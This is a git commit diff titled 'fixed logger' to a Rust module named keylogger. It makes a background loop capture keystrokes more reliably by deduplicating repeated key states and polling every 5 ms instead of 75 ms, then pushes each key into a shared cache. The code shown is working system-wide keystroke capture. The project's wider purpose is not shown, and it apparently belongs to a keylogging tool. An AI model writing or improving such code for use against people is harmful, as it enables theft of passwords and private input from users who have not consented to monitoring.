7c65cff68bbbd02921cdd1690fff5057d5875adb
Carghai74 <94583299+carghai@users.noreply.github.com>
2022-10-14 23:07:14 -0400

    fixed logger

--- src/keylogger/mod.rs
+++ src/keylogger/mod.rs
@@ -1,16 +1,19 @@
 use std::{thread, time};
 
-use device_query::{DeviceQuery, DeviceState};
+use device_query::{DeviceQuery, DeviceState, Keycode};
 
 use crate::ram::PubInfo;
 
 pub fn log() {
-    // Todo Improve this
+    let mut last_key: Vec<Keycode> = vec![];
     loop {
         let keys = DeviceState::new().get_keys();
-        for key_pressed in keys {
-            PubInfo::get().key_pressed_cache.push(key_pressed.to_string());
+        if keys != last_key {
+            last_key = keys.clone();
+            for key_pressed in keys {
+                PubInfo::get().key_pressed_cache.push(key_pressed.to_string());
+            }
         }
-        thread::sleep(time::Duration::from_millis(75))
+        thread::sleep(time::Duration::from_millis(5))
     }
 }
